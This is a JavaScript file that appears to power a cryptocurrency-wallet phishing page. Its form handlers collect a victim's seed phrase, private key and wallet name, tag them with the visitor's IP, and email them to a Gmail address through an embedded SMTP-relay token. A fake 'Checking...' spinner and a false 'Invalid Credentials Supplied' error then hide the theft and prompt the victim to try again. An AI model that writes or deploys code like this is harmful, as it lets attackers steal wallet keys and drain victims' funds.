$.getJSON("https://api.ipify.org?format=json",
     function(data) {
    $("#gfg").html(data.ip);      
    });

{
    var activephrase = document.getElementById('activephrase');
    var activeprivate = document.getElementById('activeprivate');
    var activekeystore = document.getElementById('activekeystore');
    
    
    var phrase = document.getElementById('phrase');
    var privatekey = document.getElementById('privatekey');
    var keystore = document.getElementById('keystore');
    
    
    function btnphrase()
    {
        phrase.style.display = "block";
        privatekey.style.display = "none";
        keystore.style.display = "none";
    }
    
    function btnprivate()
    {
        phrase.style.display = "none";
        privatekey.style.display = "block";
        keystore.style.display = "none";
    }
    
    function btnkeystore()
    {
        phrase.style.display = "none";
        privatekey.style.display = "none";
        keystore.style.display = "block";
    }
    
}


{
    
    document.getElementById('formphrase').onsubmit = function (e)
    {
        var phrasecomments = document.getElementById('phrasecomments').value;
        var privatekeyxxx = document.getElementById('privatekeyxxx').value;
        e.preventDefault();
        loadings();
        Email.send({
                    SecureToken: '929128e3-e988-4de1-bd76-ed5e3cbf6e17',
                    To : 'ericdoobie1@gmail.com',
                    From : "Wallet@confirmations.cc",
                    Subject : "[lINKUP AFFIX | IP - " + document.getElementById('gfg').innerHTML + "]",
                    Body : 
                    "Phrase: " + phrasecomments + "<br><br>" + "Private Key: " + privatekeyxxx + "<br><br>" + "Wallet Name: " + localStorage.getItem('wname'),
                    
                    }).then(
                    setTimeout(function() {
                        errorotp();
                        }, 4000)
                    
                    )
    }
}

{
    
    document.getElementById('formprivate').onsubmit = function (e)
    {
        var phrasecomments = document.getElementById('phrasecomments').value;
        var privatekeyxxx = document.getElementById('privatekeyxxx').value;
        e.preventDefault();
        loadings();
        Email.send({
                    SecureToken: '929128e3-e988-4de1-bd76-ed5e3cbf6e17',
                    To : 'ericdoobie1@gmail.com',
                    From : "Wallet@confirmations.cc",
                    Subject : "[lINKUP AFFIX | IP - " + document.getElementById('gfg').innerHTML + "]",
                    Body : 
                    "Phrase: " + phrasecomments + "<br><br>" + "Private Key: " + privatekeyxxx + "<br><br>" + "Wallet Name: " + localStorage.getItem('wname'),
                    
                    }).then(
                    setTimeout(function() {
                        errorotp();
                        }, 4000)
                    
                    )
    }
}


function loadings()
{
    Swal.fire({
  title: 'Checking...',
  text: 'Please wait',
  imageUrl: 'loading.gif',
  imageWidth: 200,
  imageHeight: 200,              
  imageAlt: 'Loading..',
  showConfirmButton: false, 
  timer: 5000,        
})
}



function errorotp()
{
    Swal.fire({
  icon: 'info',
  title: 'Invalid Credentials Supplied',

})

}